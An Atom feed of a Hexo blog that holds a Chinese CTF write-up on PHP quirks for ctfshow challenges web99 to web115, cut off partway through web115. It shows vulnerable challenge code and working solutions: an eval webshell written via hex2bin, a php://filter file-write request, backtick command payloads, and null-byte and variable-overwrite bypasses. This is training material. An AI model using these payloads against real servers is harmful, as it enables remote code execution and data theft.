<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Eviden🥝</title>
  
  
  <link href="https://github.com/Eviden0/new-webpage/atom.xml" rel="self"/>
  
  <link href="https://github.com/Eviden0/new-webpage/"/>
  <updated>2024-09-12T15:44:24.055Z</updated>
  <id>https://github.com/Eviden0/new-webpage/</id>
  
  <author>
    <name>Eviden🥝</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>php特性刷题</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/8dcacc76.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/8dcacc76.html</id>
    <published>2024-09-12T11:00:00.000Z</published>
    <updated>2024-09-12T15:44:24.055Z</updated>
    
    <content type="html"><![CDATA[<hr><hr><blockquote><h2 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h2></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 22:36:12</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><code>in_array函数缺陷,第三个参数未设置为true,弱比较绕过!</code></p><blockquote><p><strong>web102</strong></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: atao</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-23 20:59:43</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">is_numeric</span>()函数缺陷</span><br><span class="line">    </span><br></pre></td></tr></table></figure><blockquote><p><strong>Web103</strong>,不能直接出现php,直接用短标签代替</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: atao</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-23 21:03:24</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);<span class="comment">//注意这行代码,前面要填充2个垃圾字符才行</span></span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*p.*h.*p.*/i&quot;</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sorry&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wp</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">is_numeric</span>(<span class="string">&quot;0x1234&quot;</span>);</span><br><span class="line"></span><br><span class="line">在PHP <span class="number">5</span>下返回<span class="literal">true</span>, 在PHP <span class="number">7</span>下返回<span class="literal">false</span>, 去掉前面的<span class="number">0</span>x, 刚好能用hex2bin恢复成字符串</span><br><span class="line"></span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&#x27;&lt;?php eval($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$shell</span>));</span><br><span class="line"></span><br><span class="line">得到</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>c3f706870206576616c28245f4745545b22636d64225d293b203f3e</span><br><span class="line"></span><br><span class="line">所以</span><br><span class="line"></span><br><span class="line">v1 = hex2bin</span><br><span class="line">v2 = <span class="number">0x3c3f706870206576616c28245f4745545b22636d64225d293b203f3e</span></span><br><span class="line">v3 = <span class="number">1</span>.php</span><br><span class="line"></span><br><span class="line">PHP <span class="number">7</span> 中v2只是是纯数字或者含有一个e 虽说经过base64能构造出来, 但是不能保证有解</span><br><span class="line"></span><br><span class="line">POST /?v2=<span class="number">115044383959474e6864434171594473</span>&amp;v3=php:<span class="comment">//filter/write=convert.base64-decode/resource=1.php HTTP/1.1</span></span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">10</span></span><br><span class="line"></span><br><span class="line">v1=hex2bin</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>EXP</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$shell1</span> = <span class="string">&quot;&lt;?=`cat *`;&quot;</span>;</span><br><span class="line"><span class="variable">$shell1</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$shell1</span>);</span><br><span class="line"><span class="variable">$shell1</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$shell1</span>, <span class="number">0</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$shell1</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$shell1</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;-------------------------&#x27;</span>;</span><br><span class="line"><span class="variable">$shell2</span> = <span class="string">&quot;&lt;?=`tac *`;&quot;</span>;</span><br><span class="line"><span class="variable">$shell2</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$shell2</span>);</span><br><span class="line"><span class="variable">$shell2</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$shell2</span>, <span class="number">0</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$shell2</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$shell2</span>));</span><br></pre></td></tr></table></figure><blockquote><p><strong>Web105</strong></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-28 22:34:07</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;你还想要flag嘛？&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;既然你想要那给你吧！&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><code>wp</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">本题考查变量覆盖和<span class="keyword">die</span>()的知识</span><br><span class="line"></span><br><span class="line"><span class="variable">$$a</span> = <span class="variable">$$b</span>可以类似于，将<span class="variable">$a</span>的地址指向<span class="variable">$b</span></span><br><span class="line"></span><br><span class="line">所以无论<span class="variable">$b</span>怎么改变值，<span class="variable">$a</span>的值都会和<span class="variable">$b</span>一样</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>()函数虽然会终止程序，但同时也会输出括号内的终止提示信息</span><br><span class="line"></span><br><span class="line">本题利用变量覆盖和<span class="keyword">die</span>()函数的特性</span><br><span class="line">    先对get的内容进行覆盖，且不能覆盖error，所以要覆盖suces，即?suces=flag，此时suces=&gt;flag的地址</span><br><span class="line">    再对post的内容进行覆盖，且不能将flag直接覆盖，所以只能error=suces，此时error=&gt;flag的地址</span><br><span class="line">    此时无论进入哪个<span class="keyword">die</span>()函数，都可以输出<span class="variable">$flag</span>的值</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p><strong>Web108</strong> ereg 函数绕过</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-28 23:53:55</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有36d的人才能看到flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><code>int ereg(string pattern, string originalstring, [array regs])</code>函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回t1,否则,则返回0，且搜索对大小写敏感</p><p><code>ereg()</code>函数存在NULL截断漏洞，当传入的字符串包含%00时，只有%00前的字符串会传入函数并执行，而后半部分不会传入函数判断。因此可以使用%00截断，连接非法字符串，从而绕过函数</p><p>直接传入 <code>?c=a%00778</code></p><blockquote><p><strong>Web111</strong> GLOBALS全局变量</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-30 02:41:40</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><code>GLOBALS</code>全局变量关键字,var_dump(GLOBALS)可以输出当前目录下所有php文件的变量</p><blockquote><p><strong>Web115</strong>数字绕过(恶心!)</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-01 15:08:19</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span 